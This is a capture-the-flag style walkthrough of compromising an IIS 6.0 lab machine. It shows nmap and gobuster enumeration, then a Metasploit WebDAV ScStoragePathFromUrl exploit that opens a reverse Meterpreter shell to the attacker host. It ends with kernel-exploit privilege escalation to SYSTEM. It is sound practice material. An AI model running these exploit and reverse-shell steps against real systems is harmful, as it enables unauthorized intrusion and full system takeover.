# nmap
enumerating the target using nmap,
```                                                                                                                  
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.2.63                                                                                  130 â¨¯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 12:55 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:55
Completed Parallel DNS resolution of 1 host. at 12:55, 0.01s elapsed
Initiating SYN Stealth Scan at 12:55
Scanning 10.129.2.63 [20000 ports]
Discovered open port 80/tcp on 10.129.2.63
SYN Stealth Scan Timing: About 8.67% done; ETC: 13:01 (0:05:26 remaining)
SYN Stealth Scan Timing: About 36.00% done; ETC: 12:57 (0:01:48 remaining)
SYN Stealth Scan Timing: About 70.70% done; ETC: 12:57 (0:00:38 remaining)
Completed SYN Stealth Scan at 12:57, 131.33s elapsed (20000 total ports)
Initiating Service scan at 12:57
Scanning 1 service on 10.129.2.63
Completed Service scan at 12:57, 6.57s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.2.63
Retrying OS detection (try #2) against 10.129.2.63
Initiating Traceroute at 12:57
Completed Traceroute at 12:57, 0.48s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:57
Completed Parallel DNS resolution of 2 hosts. at 12:57, 0.01s elapsed
NSE: Script scanning 10.129.2.63.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 6.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 1.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
Nmap scan report for 10.129.2.63
Host is up, received user-set (0.38s latency).
Scanned at 2021-08-21 12:55:04 IST for 157s
Not shown: 19999 filtered ports
Reason: 19999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Error
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sat, 21 Aug 2021 07:27:33 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows Server 2003 SP2 (90%), Microsoft Windows XP SP3 (89%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (88%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/21%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6120AAED%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=10F%TI=I%TS=0)
SEQ(SP=FD%GCD=5%ISR=10F%TI=I%II=I%SS=S%TS=0)
OPS(O1=M54BNW0NNT00NNS%O2=M54BNW0NNT00NNS%O3=M54BNW0NNT00%O4=M54BNW0NNT00NNS%O5=M54BNW0NNT00NNS%O6=M54BNNT00NNS)
WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)
ECN(R=Y%DF=N%TG=80%W=FAF0%O=M54BNW0NNS%CC=N%Q=)
T1(R=Y%DF=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   244.85 ms 10.10.16.1
2   479.04 ms 10.129.2.63

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.90 seconds
           Raw packets sent: 40162 (1.771MB) | Rcvd: 120 (6.782KB)
```
so,we got a webdav service running with possible http methods.

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.2.63 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.2.63
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/21 12:22:37 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.2.63/_private             [Size: 153] [--> http://10.129.2.63/%5Fprivate/]
http://10.129.2.63/_vti_log             [Size: 155] [--> http://10.129.2.63/%5Fvti%5Flog/]
http://10.129.2.63/_vti_bin             [Size: 155] [--> http://10.129.2.63/%5Fvti%5Fbin/]
http://10.129.2.63/_vti_bin/shtml.dll   [Size: 96]                                        
http://10.129.2.63/_vti_bin/_vti_aut/author.dll [Size: 195]                               
http://10.129.2.63/_vti_bin/_vti_adm/admin.dll [Size: 195]                                
http://10.129.2.63/aspnet_client        [Size: 158] [--> http://10.129.2.63/aspnet%5Fclient/]
http://10.129.2.63/Images               [Size: 149] [--> http://10.129.2.63/Images/]         
http://10.129.2.63/images               [Size: 149] [--> http://10.129.2.63/images/]         
                                                                                             
===============================================================
2021/08/21 12:24:41 Finished
===============================================================

```
nothing juicy here.
# searchsploit

I searched for webdav in ssearchsploit.
```
Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overflow (Metasploit)                 | windows/remote/41992.rb
```
there is a metasploit module for this,so I tried it.

# metasploit

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.129.2.63
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.129.2.63:1030) at 2021-08-21 12:24:06 +0530

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > ps

Process List
============

 PID   PPID  Name             Arch  Session  User                       Path
 ---   ----  ----             ----  -------  ----                       ----
 0     0     [System Process
             ]
 4     0     System
 272   4     smss.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 620   396   svchost.exe
 680   396   svchost.exe
 740   396   svchost.exe
 768   396   svchost.exe
 804   396   svchost.exe
 960   396   spoolsv.exe
 988   396   msdtc.exe
 1100  396   cisvc.exe
 1144  396   svchost.exe
 1204  396   inetinfo.exe
 1244  396   svchost.exe
 1332  396   VGAuthService.e
             xe
 1432  396   vmtoolsd.exe
 1484  396   svchost.exe
 1624  396   svchost.exe
 1740  396   alg.exe
 1808  396   dllhost.exe
 1820  620   wmiprvse.exe     x86   0        NT AUTHORITY\NETWORK SERV  C:\WINDOWS\system32\wbem\
                                             ICE                        wmiprvse.exe
 1940  396   dllhost.exe
 2140  396   vssvc.exe
 2196  1484  w3wp.exe         x86   0        NT AUTHORITY\NETWORK SERV  c:\windows\system32\inets
                                             ICE                        rv\w3wp.exe
 2316  1484  w3wp.exe
 2628  620   wmiprvse.exe
 2696  620   davcdata.exe     x86   0        NT AUTHORITY\NETWORK SERV  C:\WINDOWS\system32\inets
                                             ICE                        rv\davcdata.exe
 2868  2196  rundll32.exe     x86   0                                   C:\WINDOWS\system32\rundl
                                                                        l32.exe

meterpreter > migrate 2696
[*] Migrating from 2868 to 2696...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```
I got a shell with very less privileges and less stable process.I migrated to a more stable process.

# PrivEsc

```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.2.63 - Collecting local exploits for x86/windows...
[*] 10.129.2.63 - 38 exploit checks are being tried...
[+] 10.129.2.63 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.129.2.63 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.129.2.63 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  A vulnerability within the Microsoft TCP/IP protocol driver 
  tcpip.sys can allow a local attacker to trigger a NULL pointer 
  dereference by using a specially crafted IOCTL. This flaw can be 
  abused to elevate privileges to SYSTEM.
[+] 10.129.2.63 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.129.2.63 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.129.2.63 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 10.129.2.63 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
[*] Post module execution completed
```

from these findings I tried using exploit/windows/local/ms15_051_client_copy_image and managed to escalate my privileges.

```
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost 10.10.16.2
lhost => 10.10.16.2
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Launching notepad to host the exploit...
[+] Process 2996 launched.
[*] Reflectively injecting the exploit DLL into 2996...
[*] Injecting exploit into 2996...
[*] Exploit injected. Injecting payload into 2996...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.2.63
[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.129.2.63:1031) at 2021-08-21 12:30:14 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
